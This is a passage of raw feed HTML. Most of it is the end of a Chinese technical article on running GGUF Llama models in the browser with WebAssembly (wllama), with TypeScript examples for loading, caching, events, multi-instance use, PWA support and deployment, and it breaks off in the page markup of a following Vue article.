                updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">content</span> = text;
              }
              <span class="hljs-keyword">return</span> updated;
            });
          },
        }
      );
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'生成失败:'</span>, err);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">".gguf"</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{loadModel}</span> /&gt;</span>
      {/* UI组件... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-25">从URL加载（自动缓存）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 从URL加载模型，自动缓存到IndexedDB</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 默认启用</span>
  <span class="hljs-attr">downloadOptions</span>: {
    <span class="hljs-attr">progressCallback</span>: <span class="hljs-function">(<span class="hljs-params">progress</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> percent = progress.<span class="hljs-property">total</span> &gt; <span class="hljs-number">0</span> 
        ? (progress.<span class="hljs-property">loaded</span> / progress.<span class="hljs-property">total</span>) * <span class="hljs-number">100</span> 
        : <span class="hljs-number">0</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`下载进度: <span class="hljs-subst">${percent.toFixed(<span class="hljs-number">1</span>)}</span>%`</span>);
    },
  },
});

<span class="hljs-comment">// 下次加载时，会自动从缓存读取，无需重新下载</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-comment">// useCache: true 是默认值</span>
});
</code></pre>
<h3 data-id="heading-26">事件监听</h3>
<pre><code class="hljs language-typescript" lang="typescript">wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADING</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模型加载中...'</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { metadata, runtimeInfo } = data <span class="hljs-keyword">as</span> {
    metadata?: <span class="hljs-title class_">ModelMetadata</span>;
    runtimeInfo?: <span class="hljs-title class_">RuntimeInfo</span>;
  };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模型已加载:'</span>, metadata?.<span class="hljs-property">name</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'多线程模式:'</span>, runtimeInfo?.<span class="hljs-property">isMultithread</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'生成中:'</span>, text <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>);
});

wllamaCore.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">ERROR</span>, <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'错误:'</span>, error <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>);
});
</code></pre>
<h3 data-id="heading-27">多实例使用</h3>
<p>使用工厂类创建和管理多个实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { wllamaCoreFactory, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-title class_">WllamaCoreEvent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// 方式1: 使用 getOrCreate（推荐，如果实例已存在则返回现有实例）</span>
<span class="hljs-keyword">const</span> instance1 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-1'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
<span class="hljs-keyword">const</span> instance2 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-2'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// 方式2: 使用 create（如果实例已存在会抛出错误）</span>
<span class="hljs-comment">// const instance1 = wllamaCoreFactory.create({ paths: WLLAMA_CONFIG_PATHS }, 'chat-1');</span>

<span class="hljs-comment">// 方式3: 使用 getDefault（获取或创建默认实例，向后兼容）</span>
<span class="hljs-comment">// const defaultInstance = wllamaCoreFactory.getDefault({ paths: WLLAMA_CONFIG_PATHS });</span>

<span class="hljs-comment">// 加载不同的模型</span>
<span class="hljs-keyword">await</span> instance1.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model1.gguf'</span>);
<span class="hljs-keyword">await</span> instance2.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model2.gguf'</span>);

<span class="hljs-comment">// 监听事件（事件数据包含 instanceId）</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-1'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'聊天1更新:'</span>, data.<span class="hljs-property">data</span>);
  }
});

instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-2'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'聊天2更新:'</span>, data.<span class="hljs-property">data</span>);
  }
});

<span class="hljs-comment">// 同时进行多个对话</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages1</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'你好'</span> }];
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages2</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'Hello'</span> }];

<span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  instance1.<span class="hljs-title function_">createChatCompletion</span>(messages1),
  instance2.<span class="hljs-title function_">createChatCompletion</span>(messages2),
]);

<span class="hljs-comment">// 获取实例信息</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'实例1 ID:'</span>, instance1.<span class="hljs-title function_">getInstanceId</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'当前实例数:'</span>, wllamaCoreFactory.<span class="hljs-title function_">getInstanceCount</span>());

<span class="hljs-comment">// 清理</span>
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-1'</span>);
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-2'</span>);
<span class="hljs-comment">// 或清理所有实例</span>
<span class="hljs-comment">// await wllamaCoreFactory.destroyAll();</span>
</code></pre>
<h3 data-id="heading-28">PWA 安装和使用</h3>
<p>项目支持完整的 PWA 功能，用户可以像安装原生应用一样安装：</p>
<p><strong>安装步骤</strong>：</p>
<ol>
<li>
<p><strong>在桌面浏览器</strong>：</p>
<ul>
<li>访问应用后，浏览器地址栏会显示安装图标</li>
<li>点击安装图标，选择"安装"</li>
<li>应用会添加到桌面，可以独立窗口运行</li>
</ul>
</li>
<li>
<p><strong>在移动设备</strong>：</p>
<ul>
<li>iOS Safari：点击分享按钮 → "添加到主屏幕"</li>
<li>Android Chrome：浏览器会自动显示"添加到主屏幕"横幅</li>
<li>安装后，应用会出现在主屏幕上</li>
</ul>
</li>
</ol>
<p><strong>离线使用</strong>：</p>
<ul>
<li>安装后，应用的核心功能可以在离线状态下使用</li>
<li>已加载的模型文件存储在 IndexedDB 中，离线时仍可使用</li>
<li>Service Worker 会缓存访问过的页面，离线时也能浏览</li>
</ul>
<p><strong>Service Worker 管理</strong>：</p>
<p>项目提供了 Service Worker 管理功能，可以通过组件控制：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Service Worker 只在 PWA 环境下自动注册</span>
<span class="hljs-comment">// 可以通过全局方法管理</span>
(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">swManager</span>.<span class="hljs-title function_">status</span>(); <span class="hljs-comment">// 查看状态</span>
(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">swManager</span>.<span class="hljs-title function_">unregister</span>(); <span class="hljs-comment">// 卸载 Service Worker</span>
</code></pre>
<p><strong>PWA 配置要点</strong>：</p>
<ul>
<li><code>manifest.json</code> 配置了应用的基本信息、图标和显示模式</li>
<li>Service Worker 实现了智能缓存策略</li>
<li>支持自动更新，后台检测新版本</li>
<li>只在 PWA 环境下注册，避免在普通浏览器中占用资源</li>
</ul>
<h3 data-id="heading-29">非React环境使用</h3>
<p>核心库 <code>wllama-core</code> 不依赖 React，可以在任何 JavaScript/TypeScript 环境中使用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 纯JavaScript/TypeScript环境</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./wllama-core'</span>;

<span class="hljs-keyword">const</span> wllamaCore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// 加载模型</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>(files, { <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span> });

<span class="hljs-comment">// 生成文本</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">createChatCompletion</span>([
  { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'你好！'</span> }
], {
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);
</code></pre>
<h2 data-id="heading-30">项目结构</h2>
<pre><code class="hljs language-csharp" lang="csharp">mvp-ai-wllama/
├── src/
│   ├── app/                    <span class="hljs-meta"># Next.js 应用页面</span>
│   │   ├── wllama/
│   │   │   ├── load-<span class="hljs-keyword">from</span>-file/    <span class="hljs-meta"># 从文件加载页面</span>
│   │   │   ├── load-<span class="hljs-keyword">from</span>-url/     <span class="hljs-meta"># 从URL加载页面</span>
│   │   │   ├── load-<span class="hljs-keyword">from</span>-cache/   <span class="hljs-meta"># 从缓存加载页面</span>
│   │   │   ├── manager-cache/     <span class="hljs-meta"># 缓存管理页面</span>
│   │   │   └── multi-instance/     <span class="hljs-meta"># 多实例演示页面</span>
│   │   └── layout.tsx             <span class="hljs-meta"># 布局组件（包含 PWA manifest 配置）</span>
│   ├── wllama-core/            <span class="hljs-meta"># 核心库（无React依赖）</span>
│   │   ├── wllama-core.ts      <span class="hljs-meta"># 核心封装类</span>
│   │   ├── wllama-core-factory.ts <span class="hljs-meta"># 工厂类（多实例管理）</span>
│   │   ├── cache-manager.ts    <span class="hljs-meta"># 缓存管理器</span>
│   │   ├── storage.ts          <span class="hljs-meta"># localStorage工具</span>
│   │   ├── utils.ts            <span class="hljs-meta"># 工具函数</span>
│   │   ├── types.ts            <span class="hljs-meta"># 类型定义</span>
│   │   └── config.ts           <span class="hljs-meta"># 配置</span>
│   └── components/             <span class="hljs-meta"># React组件</span>
│       ├── StudioLayout/       <span class="hljs-meta"># 布局组件</span>
│       ├── Loading.tsx         <span class="hljs-meta"># 加载组件</span>
│       ├── ServiceWorkerManager.tsx <span class="hljs-meta"># Service Worker 管理组件</span>
│       └── ServiceWorkerUninstall.tsx <span class="hljs-meta"># Service Worker 卸载组件</span>
├── <span class="hljs-keyword">public</span>/
│   ├── manifest.json          <span class="hljs-meta"># PWA 清单文件</span>
│   ├── sw.js                  <span class="hljs-meta"># Service Worker 文件</span>
│   ├── icon<span class="hljs-number">-192.</span>png           <span class="hljs-meta"># PWA 图标（192x192）</span>
│   ├── icon<span class="hljs-number">-512.</span>png           <span class="hljs-meta"># PWA 图标（512x512）</span>
│   └── wasm/
│       └── wllama/
│           ├── multi-thread/   <span class="hljs-meta"># 多线程WASM</span>
│           └── single-thread/  <span class="hljs-meta"># 单线程WASM</span>
└── src/middleware.ts          <span class="hljs-meta"># Next.js中间件（多线程支持）</span>
</code></pre>
<h2 data-id="heading-31">部署方案</h2>
<h3 data-id="heading-32">Vercel一键部署</h3>
<p>项目已配置，可直接部署到Vercel：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装依赖</span>
npm install

<span class="hljs-comment"># 构建项目</span>
npm run build

<span class="hljs-comment"># Vercel 会自动检测并部署</span>
</code></pre>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-ai-wllama.vercel.app%2F" target="_blank" title="https://mvp-ai-wllama.vercel.app/" ref="nofollow noopener noreferrer">mvp-ai-wllama.vercel.app/</a></p>
<h3 data-id="heading-33">静态文件部署</h3>
<p>项目支持静态导出，构建后的文件可部署到任何静态托管服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 构建静态文件</span>
npm run build

<span class="hljs-comment"># 输出目录: out/</span>
<span class="hljs-comment"># 可直接部署到 GitHub Pages、Netlify、Nginx 等</span>
</code></pre>
<h3 data-id="heading-34">多线程支持配置</h3>
<p>如需启用多线程支持，需要配置正确的 HTTP 响应头：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/middleware.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
  
  <span class="hljs-comment">// 启用 SharedArrayBuffer 支持</span>
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Opener-Policy'</span>, <span class="hljs-string">'same-origin'</span>);
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Embedder-Policy'</span>, <span class="hljs-string">'require-corp'</span>);
  
  <span class="hljs-keyword">return</span> response;
}
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>必须在 HTTPS 环境下运行（或 localhost）</li>
<li>需要浏览器支持 SharedArrayBuffer</li>
<li>某些CDN可能不支持这些响应头，需要配置</li>
</ul>
<h2 data-id="heading-35">技术优势总结</h2>


















































<table><thead><tr><th>特性</th><th>传统方案</th><th>本方案</th></tr></thead><tbody><tr><td>数据安全</td><td>❌ 需要上传服务器</td><td>✅ 完全本地处理</td></tr><tr><td>部署成本</td><td>❌ 需要后端服务</td><td>✅ 纯静态部署</td></tr><tr><td>模型格式</td><td>⚠️ 需要转换</td><td>✅ 直接支持GGUF格式</td></tr><tr><td>离线使用</td><td>❌ 需要网络</td><td>✅ 完全离线</td></tr><tr><td>性能优化</td><td>⚠️ 依赖网络</td><td>✅ IndexedDB缓存 + 多线程</td></tr><tr><td>隐私保护</td><td>⚠️ 数据上传</td><td>✅ 数据不出浏览器</td></tr><tr><td>参数控制</td><td>⚠️ 复杂配置</td><td>✅ 简单API + 自动持久化</td></tr><tr><td>流式输出</td><td>⚠️ 需要WebSocket</td><td>✅ 原生支持流式生成</td></tr></tbody></table>
<h2 data-id="heading-36">技术原理</h2>
<h3 data-id="heading-37">使用WebAssembly运行Llama模型</h3>
<p>传统AI模型推理需要：</p>
<ol>
<li>搭建GPU服务器</li>
<li>配置CUDA环境</li>
<li>处理模型加载和推理</li>
<li>管理服务器资源</li>
</ol>
<p>本方案通过WebAssembly技术：</p>
<ol>
<li>在浏览器中直接运行Llama模型推理</li>
<li>使用WASM实现高性能计算</li>
<li>完全客户端化，无需服务器</li>
<li>支持多线程加速（SharedArrayBuffer）</li>
</ol>
<h3 data-id="heading-38">GGUF模型格式</h3>
<p>GGUF（GPT-Generated Unified Format）是专门为Llama模型设计的格式：</p>
<ul>
<li><strong>量化支持</strong>：支持多种量化级别（Q4_K_M, Q8_0等）</li>
<li><strong>快速加载</strong>：优化的文件结构，加载速度快</li>
<li><strong>内存效率</strong>：量化后模型体积大幅减小</li>
<li><strong>跨平台</strong>：统一的格式，跨平台兼容</li>
</ul>
<h3 data-id="heading-39">IndexedDB缓存机制</h3>
<ul>
<li><strong>持久化存储</strong>：模型文件存储在浏览器IndexedDB中，关闭浏览器后仍保留</li>
<li><strong>URL映射</strong>：使用SHA-1哈希将URL映射为唯一文件名</li>
<li><strong>进度追踪</strong>：支持下载进度实时反馈</li>
<li><strong>元数据扩展</strong>：可扩展的元数据结构，支持ETag、创建时间等</li>
</ul>
<h3 data-id="heading-40">多线程加速原理</h3>
<ul>
<li><strong>SharedArrayBuffer</strong>：允许多个Web Worker共享内存</li>
<li><strong>自动检测</strong>：自动检测浏览器是否支持多线程</li>
<li><strong>性能提升</strong>：多线程模式下推理速度可提升2-4倍</li>
<li><strong>安全限制</strong>：需要设置COOP/COEP响应头</li>
</ul>
<h3 data-id="heading-41">参考项目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frahuldshetty%2Fwllama" target="_blank" title="https://github.com/rahuldshetty/wllama" ref="nofollow noopener noreferrer">wllama</a> - WebAssembly Llama运行时</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fggerganov%2Fllama.cpp" target="_blank" title="https://github.com/ggerganov/llama.cpp" ref="nofollow noopener noreferrer">llama.cpp</a> - Llama模型C++实现</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fggerganov%2Fggml%2Fblob%2Fmaster%2Fdocs%2Fgguf.md" target="_blank" title="https://github.com/ggerganov/ggml/blob/master/docs/gguf.md" ref="nofollow noopener noreferrer">GGUF</a> - GGUF格式规范</li>
</ul>
<h2 data-id="heading-42">开源地址</h2>
<p>🔗 <strong>GitHub仓库</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felectroluxcode%2Fmvp-ai-wllama" target="_blank" title="https://github.com/electroluxcode/mvp-ai-wllama" ref="nofollow noopener noreferrer">mvp-ai-wllama</a></p>
<h2 data-id="heading-43">总结</h2>
<p>本项目提供了一个完整的纯前端Llama模型推理方案，通过WebAssembly技术实现了模型推理的本地化，结合React和现代化的缓存系统，打造了一个功能完善、性能优秀的AI对话应用。</p>
<p><strong>核心亮点</strong>：</p>
<ul>
<li>🚀 纯前端架构，无需后端服务</li>
<li>🔒 数据完全本地化，保护隐私安全</li>
<li>⚡ 基于WebAssembly的高性能推理</li>
<li>💾 IndexedDB缓存系统，支持大文件存储</li>
<li>🔄 流式生成支持，实时输出</li>
<li>🧵 多线程加速，性能提升显著</li>
<li>🔀 多实例支持，可同时运行多个模型实例</li>
<li>📱 PWA 支持，可安装到设备，支持离线使用</li>
<li>📦 零React依赖的核心库，可接入任何系统</li>
<li>🎯 完整的类型定义，开发体验优秀</li>
</ul>
<p>欢迎Star和Fork，一起推动前端AI技术的发展！</p>
<hr/>
<p><strong>相关阅读</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frahuldshetty%2Fwllama" target="_blank" title="https://github.com/rahuldshetty/wllama" ref="nofollow noopener noreferrer">wllama 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebassembly.org%2F" target="_blank" title="https://webassembly.org/" ref="nofollow noopener noreferrer">WebAssembly 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FIndexedDB_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" ref="nofollow noopener noreferrer">IndexedDB API 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Fdeploying%2Fstatic-exports" target="_blank" title="https://nextjs.org/docs/app/building-your-application/deploying/static-exports" ref="nofollow noopener noreferrer">Next.js 静态导出</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 响应式原理深度解析]]></title>    <link>https://juejin.cn/post/7592768559170256922</link>    <guid>https://juejin.cn/post/7592768559170256922</guid>    <pubDate>2026-01-08T08:57:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592768559170256922" data-draft-id="7592768559170191386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 响应式原理深度解析"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T08:57:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="满天星辰"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 响应式原理深度解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    满天星辰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:57:35.000Z" title="Thu Jan 08 2026 08:57:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 